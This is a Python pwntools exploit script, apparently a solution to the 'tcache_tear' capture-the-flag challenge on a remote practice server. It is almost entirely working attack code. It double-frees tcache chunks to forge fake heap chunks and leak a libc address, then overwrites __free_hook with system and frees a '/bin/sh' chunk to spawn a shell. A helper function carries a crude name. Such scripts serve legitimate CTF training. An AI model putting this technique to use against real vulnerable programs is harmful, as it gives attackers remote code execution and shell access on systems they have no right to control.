#coding=utf-8
from pwn import *
local = 0
exec_file="./tcache_tear"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("node3.buuoj.cn",26212)
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc-2.27.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x00400C0C
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("Size:",str(size))
    a.sendafter("Data:",content)
    return 

def delete():
    menu(2)
    return 
    
def edit(idx,content):
    return 
    
def show():
    menu(3)
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33
a.sendafter("Name:","jlx")
next_chunk = 0x602050 + 0x500
add(0x58,"aaa")
delete()
delete()
add(0x58,p64(next_chunk))
add(0x58,"aaa")
payload = p64(0) + p64(0x21) + p64(0) * 2 + p64(0) + p64(0x21)
add(0x58,payload)

add(0x68,"aaa")
delete()
delete()
add(0x68,p64(0x602060 - 0x10))
add(0x68,"aaa")
payload = p64(0) + p64(0x501) + p64(0) * 5 + p64(0x602060)
add(0x68,payload)

delete()
show()
a.recvuntil("Name :")
libc_base = u64(a.recv(6) + 2*'\x00') - libc.sym["__malloc_hook"] - 0x10 - 96
fuck(libc_base)

add(0x48,"aaa")
delete()
delete()
add(0x48,p64(libc.sym["__free_hook"] + libc_base))
add(0x48,"aaa")
#debug()
add(0x48,p64(libc_base + libc.sym["system"]))

add(0x28,"/bin/sh\x00")
delete()
a.interactive()
